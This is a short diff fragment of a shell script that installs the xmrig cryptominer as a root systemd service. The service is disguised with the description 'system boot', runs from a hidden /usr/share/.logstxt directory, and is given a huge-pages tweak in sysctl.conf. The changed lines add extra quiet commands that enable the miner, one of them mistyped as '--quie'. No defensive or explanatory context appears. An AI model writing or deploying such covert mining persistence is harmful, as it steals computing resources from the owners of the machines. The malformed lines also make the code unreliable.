@@ -29,7 +29,9 @@ then
    append=$(echo -e "[Unit]\nDescription=system boot\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=1200\nUser=root\nExecStart=/usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json --      threads=$tf\nRemainAfterExit=yes\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target">/etc/systemd/system/xmrig.service)
    sys=$(echo "vm.nr_hugepages=1280">>/etc/sysctl.conf)
    system=$(sysctl --quiet --system && systemctl daemon-reload && systemctl enable --now xmrig --quiet)
-   
+   systemctl enable --now xmrig --quiet
+   systemctl daemon-reload
+   systemctl enable --now xmrig --quie
    $files
    $per
    $dir
